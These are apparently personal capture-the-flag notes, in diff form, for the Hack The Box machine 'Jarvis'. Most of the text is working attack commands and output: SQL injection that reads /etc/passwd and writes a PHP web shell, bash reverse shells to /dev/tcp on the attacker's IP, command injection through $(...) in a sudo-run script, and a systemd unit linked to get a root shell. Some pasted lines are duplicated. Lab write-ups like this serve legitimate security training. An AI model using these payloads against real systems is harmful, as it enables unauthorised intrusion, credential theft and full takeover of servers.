@@ -1,9 +1,48 @@
 
 
 
+http://10.10.10.143/room.php?cod=1
+
+http://10.10.10.143/room.php?cod=1 order by 5
+
+"The URL above returns the room which means the table has either 5 columns or more. On
+incrementing the value by 1 each time, we find that no room is return for the value 8 which means
+that the table has 7 columns"
+
+find the injectable columns, we need to use the negative value, 
+or a value that doesnt exist to prevent the room being selected over our values
+http://10.10.10.143/room.php?cod=-1%20union%20select%201,2,3,4,5,6,7
+
+we see 5,2,3,4 on the page, these are injectable
+
+now we replace those with database functions
+
+http://10.10.10.143/room.php?cod=1000%20union%20select%201,version(),user(),4,5,6,7
+
+10.1.48-MariaDB-0+deb9u2
+
+$ DBadmin@localhost 
+
+now we test load file
+http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7
+
+we see pepper as a user
+
+"Let’s also check if we can write files to the server. We can inspect the apache configuration to
+identify the path of the webroot. Ideally, the apache2 configuration is located at
+/etc/apache2/sites-enabled/000-default.conf"
+
+"The path is configured with the default path /var/www/html. In MySQL, we can write files using
+the “INTO OUTFILE” keyword. "
+
+so we write a webshell
 
 http://10.10.10.143/room.php?cod=-1 union select 1,'<?php echo shell_exec($_GET["cmd"]);?>',3,4,5,6,7 into outfile '/var/www/html/shell.php'
 
+http://10.10.10.143/shell.php?cmd=id
+we're good to go.
+
+10.10.10.143/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.27%2F443%200%3E%261%27
 
 ┌──(kali㉿kali)-[~]
 └─$ curl "http://10.10.10.143/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.14.2/5555%200%3E%261'" 
@@ -181,3 +220,150 @@ if __name__ == '__main__':
         exit()
 www-data@jarvis:/var/www/html$ 
 
+
+"e see that it takes an IP address on using the -p argument, and then uses
+the os.system() function to execute ping."
+
+"A few characters (& ; - ` |) are blocked by the script, in order to prevent injection. But the
+characters ‘$’ , ‘(‘ and ‘)’ aren’t blocked. This will let us inject commands through bash command
+substitution i.e “$(cmd)”. "
+
+
+www-data@jarvis:/var/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p "$(bash -c 'bash -i >& /dev/tcp/10.10.14.27/53 0>&1')"
+
+this doesnt work, and gives us another www-data shell. the shell that expands $(...) is still running as www-data
+
+we need to write a file and then have pepper run it after sudo passes off
+
+
+www-data@jarvis:/var/tmp$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.27/53 0>&1"' > shell.sh
+www-data@jarvis:/var/tmp$ chmod +x shell.sh
+www-data@jarvis:/var/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+
+Enter an IP: $(/var/tmp/shell.sh)
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 53
+listening on [any] 53 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.143] 40898
+pepper@jarvis:/var/tmp$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/systemctl
+/bin/umount
+/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+pepper@jarvis:/var/tmp$ 
+
+"The systemctl command is used to manage services on a system running systemd. Usually, the
+configuration files are located are /etc/system/systemd. However, as we’re not root, it’s not
+possible to write a file to this folder. Instead, we can use the systemctl link command"
+
+"the link command can be used to include a configuration file
+that isn’t in the default search path. This will help us create a unit file at any location and link it,
+which will let us start the service."
+
+GTFObins
+
+
+
+pepper@jarvis:/var/tmp$ echo -e "[Unit]\nDescription=pwn\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.27/2 0>&1'\n[Install]\nWantedBy=multi-user.target" > /tmp/pwn.service
+ /dev/tcp/10.10.14.27/2 0>&1'\n[Install]\nWantedBy=multi-user.target" > /tmp/pwn.service-i >& 
+pepper@jarvis:/var/tmp$ cat /tmp/pwn.service
+cat /tmp/pwn.service
+[Unit]
+Description=pwn
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.27/2 0>&1'
+[Install]
+WantedBy=multi-user.target
+pepper@jarvis:/var/tmp$
+pepper@jarvis:/var/tmp$ /bin/systemctl link /tmp/pwn.service
+/bin/systemctl link /tmp/pwn.service
+Failed to link unit: No such file or directory
+pepper@jarvis:/var/tmp$ 
+
+was giving me a hard time, /tmp may be mounted with restrictions like noexec or private for systemd
+
+
+pepper@jarvis:/var/tmp$ cp /tmp/pwn.service /dev/shm/pwn.service
+/bin/systemctl link /dev/shm/pwn.service
+/bin/systemctl start shm-pwn.servicecp /tmp/pwn.service /dev/shm/pwn.service
+pepper@jarvis:/var/tmp$ /bin/systemctl link /dev/shm/pwn.service
+Created symlink /etc/systemd/system/pwn.service -> /dev/shm/pwn.service.
+pepper@jarvis:/var/tmp$ /bin/systemctl start pwn.service        
+/bin/systemctl start pwn.service
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 2  
+listening on [any] 2 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.143] 45132
+bash: cannot set terminal process group (982): Inappropriate ioctl for device
+bash: no job control in this shell
+root@jarvis:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@jarvis:/# 
+
+
+
+
+
+
+we investigate why /tmp didnt work.
+
+root@jarvis:/root# mount | grep /tmp
+mount | grep /tmp
+root@jarvis:/root# ls -l /tmp
+ls -l /proc/1/root/tmpls -l /tmp
+total 12
+drwx------ 3 root root 4096 Dec  1 22:25 systemd-private-cd67b35646154e4c990a90950bacf7da-apache2.service-trRfvV
+drwx------ 3 root root 4096 Dec  1 22:25 systemd-private-cd67b35646154e4c990a90950bacf7da-systemd-timesyncd.service-eQrfVG
+drwx------ 2 root root 4096 Dec  1 22:26 vmware-root
+root@jarvis:/root# 
+ls -l /proc/1/root/tmp
+total 12
+drwx------ 3 root root 4096 Dec  1 22:25 systemd-private-cd67b35646154e4c990a90950bacf7da-apache2.service-trRfvV
+drwx------ 3 root root 4096 Dec  1 22:25 systemd-private-cd67b35646154e4c990a90950bacf7da-systemd-timesyncd.service-eQrfVG
+drwx------ 2 root root 4096 Dec  1 22:26 vmware-root
+root@jarvis:/root# mount | grep /dev/shm
+mount | grep /dev/shm
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+root@jarvis:/root# 
+
+
+/tmp is used by systemd for private directories (see systemd-private-* folders).
+
+When systemd runs services, it isolates /tmp for each service, so files created in /tmp from a user shell are not visible to systemd itself.
+
+/dev/shm is a shared memory filesystem (tmpfs) and is not isolated, so systemd can access files there.
+
+same wouldve happened if we used /var/tmp
+
+Both /tmp and /var/tmp are often set up as “private” (isolated) for services to improve security and prevent cross-service interference. This is called “PrivateTmp” in systemd.
+
+For most services, only global locations like /dev/shm, /home, or /opt are reliably accessible for systemd unit linking.
